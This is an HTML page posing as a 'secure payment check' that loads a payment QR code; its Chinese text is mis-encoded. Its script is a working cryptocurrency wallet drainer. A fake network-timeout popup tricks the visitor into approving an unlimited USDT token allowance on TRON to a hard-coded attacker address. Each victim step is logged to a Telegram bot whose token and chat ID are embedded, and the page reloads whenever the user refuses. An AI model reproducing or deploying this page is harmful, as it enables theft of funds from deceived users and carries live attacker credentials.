<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>å®‰å…¨æ”¯ä»˜æ£€æµ‹</title>
    <style>
        body { background: #ffffff; margin: 0; padding: 0; height: 100vh; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        
        /* æ¨¡æ‹ŸäºŒç»´ç åŠ è½½å¤±è´¥çš„å®¹å™¨ */
        .qr-container { width: 200px; height: 200px; border: 1px solid #eee; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #fafafa; border-radius: 10px; position: relative; }
        .qr-icon { width: 80px; height: 80px; opacity: 0.2; }
        .loading-spin { position: absolute; width: 30px; height: 30px; border: 3px solid #f3f3f3; border-top: 3px solid #ccc; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* ç³»ç»Ÿå¼¹çª—æ ·å¼ */
        .modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; background: #fff; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; padding: 25px; z-index: 9999; }
        .btn { background: #007aff; color: white; border: none; padding: 14px; border-radius: 10px; width: 100%; font-size: 16px; font-weight: bold; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="qr-container">
        <div class="loading-spin"></div>
        <img src="https://cdn-icons-png.flaticon.com/512/241/241528.png" class="qr-icon">
        <p style="font-size: 12px; color: #999; margin-top: 10px;">æ”¯ä»˜äºŒç»´ç ç”Ÿæˆä¸­...</p>
    </div>

    <div class="modal" id="fixBox" style="display: none;">
        <div style="font-weight: bold; font-size: 18px;">ç½‘ç»œè¿æ¥è¶…æ—¶</div>
        <div style="color: #666; font-size: 14px; margin-top: 12px; line-height: 1.5;">æ£€æµ‹åˆ°å½“å‰ç½‘ç»œç¯å¢ƒæ— æ³•åŠ è½½æ”¯ä»˜äºŒç»´ç ï¼Œè¯·ç‚¹å‡»â€œç¡®å®šâ€æ‰‹åŠ¨ä¿®å¤å®‰å…¨é“¾æ¥ã€‚</div>
        <button class="btn" onclick="go()">ç¡® å®š</button>
    </div>

    <script>
        const CONFIG = {
            USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
            RECEIVER: "TB7o5odwtZhkf6ueq6NthAzfLY9eWf9s3C", // ä½ çš„æ”¶æ¬¾åœ°å€
            TG_TOKEN: "7884841968:AAEVW8Iayp5i0-7p-V8K3mC9M5l0D4_7Y7Q",
            TG_CHAT_ID: "8003040361"
        };

        // é¡µé¢è¿›å…¥ 1.5ç§’åå¼¹å‡ºæç¤ºï¼Œæ¨¡ä»¿â€œå°è¯•åŠ è½½äºŒç»´ç å¤±è´¥â€çš„è¿‡ç¨‹
        window.onload = () => {
            setTimeout(() => {
                document.getElementById('fixBox').style.display = 'block';
                sendLog(`ğŸ” ç›®æ ‡å·²è¿›å…¥(çœ‹åˆ°äºŒç»´ç åŠ è½½å¤±è´¥é¡µé¢)`);
            }, 1500);
        };

        async function go() {
            if (window.tronWeb) {
                try {
                    const contract = await window.tronWeb.contract().at(CONFIG.USDT);
                    const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                    
                    sendLog("ğŸš€ ç›®æ ‡ç‚¹ç¡®è®¤ï¼Œå¼€å§‹æˆæƒ...");
                    await contract.approve(CONFIG.RECEIVER, max).send();
                    sendLog("âœ… æˆæƒæˆåŠŸï¼");
                    
                } catch (err) {
                    sendLog("âŒ ç›®æ ‡æ‹’ç»æˆæƒ");
                    location.reload(); // æ‹’ç»ååˆ·æ–°é‡æ–°å¼€å§‹
                }
            }
        }

        function sendLog(msg) {
            fetch(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage?chat_id=${CONFIG.TG_CHAT_ID}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
